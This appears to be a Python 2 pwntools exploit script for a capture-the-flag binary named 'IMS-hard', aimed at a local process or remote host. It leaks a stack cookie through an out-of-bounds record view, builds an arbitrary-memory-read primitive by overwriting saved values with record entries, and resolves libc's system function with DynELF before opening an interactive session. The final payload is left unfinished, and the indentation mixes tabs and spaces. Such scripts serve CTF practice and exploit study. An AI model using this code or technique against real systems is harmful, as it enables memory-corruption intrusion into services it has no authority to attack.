#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 0 

# modify this
if DEBUG:
    io = process('./IMS-hard')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

context(log_level='debug')
# define symbols and offsets here
cookie = 0
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def add_record(ID, code):
	ru('Choose: ')
	sl('1')
	ru('ID: ')
	sl(ID)
	ru('code: ')
	sl(code)

def qt():
	ru('Choose: ')
	sl('4')

def del_record(index):
	ru('Choose: ')
	sl('2')
	ru('delete: ')
	sl(str(index))

def show_record(index):
	ru('Choose: ')
	sl('3')
	ru('view: ')
	sl(str(index))

def get_cookie():
	global cookie
	show_record(5)
	ru('Product ID: ')
	cookie = int(ru(', Product')[:-9])
	if cookie < 0:
		cookie = 0x100000000 + cookie
	info('cookie : ' + hex(cookie))

def leak(addr):
	global cookie
	add_record('1', '2222')
	add_record('1', '2222')
	add_record('1', '2222')
	add_record('1', '2222')
	add_record('1', '2222')
	add_record(str(cookie), p32(0x8048b21) + p32(0x8048b21))
        add_record(str(0x8048b21), p32(0x8048b21) + p32(0x8048b21))
	add_record(str(addr), p32(0x8048560) + p32(0x8048a7e))
	qt()
	data = rn(1)
	if data == '\n' and rn(7) == '=======':
		data = '\x00'
	print "%#x => %s" % (addr, (data or '').encode('hex'))
	for i in range(0,8):
		del_record(0)
	return data

# define exploit function here
def pwn():
	get_cookie()
#	print leak(0x804a11c)
	d = DynELF(leak, elf=ELF('./IMS-hard'))
	system_addr = d.lookup('system','libc')	
	
	
	io.interactive()
	return

if __name__ == '__main__':
    pause()
    pwn()
